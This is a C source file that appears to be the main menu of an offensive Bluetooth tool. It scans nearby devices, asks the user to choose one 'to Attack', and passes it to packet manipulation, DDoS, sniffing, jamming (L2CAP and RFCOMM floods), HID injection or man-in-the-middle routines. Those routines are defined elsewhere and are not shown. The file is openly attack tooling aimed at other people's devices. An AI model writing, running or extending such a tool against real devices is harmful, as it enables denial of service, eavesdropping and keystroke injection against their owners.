#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/rfcomm.h>
#include "sniff.h"
#include "jam.h"
#include "hid.h"
#include "mitm.h"
#ifdef __cplusplus
extern "C" {
#endif
void cpp_modify_packets(const bdaddr_t* target_addr, const char* payload);
void cpp_ddos_attack(const bdaddr_t* target_addr, int duration_sec);
#ifdef __cplusplus
}
#endif

void scan_devices(bdaddr_t *target_addr) {
    inquiry_info *devices = NULL;
    int max_rsp = 255;  
    int num_rsp, i;
    char addr[19] = {0};
    char name[248] = {0};
    int dev_id = hci_get_route(NULL);
    int sock = hci_open_dev(dev_id);
    if (dev_id < 0 || sock < 0) {
        perror("Failed to open Bluetooth socket");
        exit(1);
    }

    devices = (inquiry_info *)malloc(max_rsp * sizeof(inquiry_info));
    if (!devices) {
        perror("Failed to allocate memory");
        close(sock);
        exit(1);
    }

    num_rsp = hci_inquiry(dev_id, 8, max_rsp, NULL, &devices, IREQ_CACHE_FLUSH);
    if (num_rsp < 0) {
        perror("Failed to perform Bluetooth scan");
        free(devices);
        close(sock);
        exit(1);
    }

    printf("Found %d devices:\n", num_rsp);
    for (i = 0; i < num_rsp; i++) {
        ba2str(&devices[i].bdaddr, addr);
        memset(name, 0, sizeof(name));
        if (hci_read_remote_name(sock, &devices[i].bdaddr, sizeof(name), name, 0) < 0) {
            strcpy(name, "[unknown]");
        }
        printf("%d: %s %s\n", i + 1, addr, name);
    }

    int choice;
    printf("Enter the Number of the device to Attack: \n");
    scanf("%d", &choice);
    if (choice < 1 || choice > num_rsp) {
        printf("Invalid choice.\n");
        free(devices);  
        close(sock);
        exit(1);
    }

    sleep(1);
    int attack;
    printf("Select Attack: \n");
    printf("  1. Manipulate Packet \n");
    printf("  2. DDOS Attack \n");
    printf("  3. Sniff Bluetooth Packets \n");
    printf("  4. Jamming\n");
    printf("  5. HID Attack\n");
    printf("  6. MITM Attack\n");
    printf("Select a Number Between 1 and 6 \n");
    scanf("%d", &attack);

    if (attack < 1 || attack > 6) {
        printf("Invalid attack selection.\n");
        free(devices);
        close(sock);
        exit(1);
    } else if (attack == 1) {
        char msg[1024];
        printf("Enter Payload: \n");
        getchar();
        fgets(msg, sizeof(msg), stdin);
        msg[strcspn(msg, "\n")] = 0;
        cpp_modify_packets(&devices[choice - 1].bdaddr, msg);
    } else if (attack == 2) {
        int duration;
        printf("Duration of The Attack (Seconds): \n");
        scanf("%d", &duration);
        cpp_ddos_attack(&devices[choice - 1].bdaddr, duration);
    } else if (attack == 3) {
        start_sniffing();
    } else if (attack == 4) {
        int jam;
        printf("Select Jamming Mode: \n");
        printf("    1. L2CAP Flood \n");
        printf("    2. RFCOMM Flood\n");
        scanf("%d", &jam);
        jam_device(&devices[choice - 1].bdaddr, jam);
    }else if(attack == 5){
        perform_hid_attack(&(devices + choice - 1)->bdaddr);
    }else if(attack == 6){
        start_mitm_attack(&(devices + choice - 1)->bdaddr);
    }
    bacpy(target_addr, &devices[choice - 1].bdaddr);
    free(devices);
    close(sock);
}
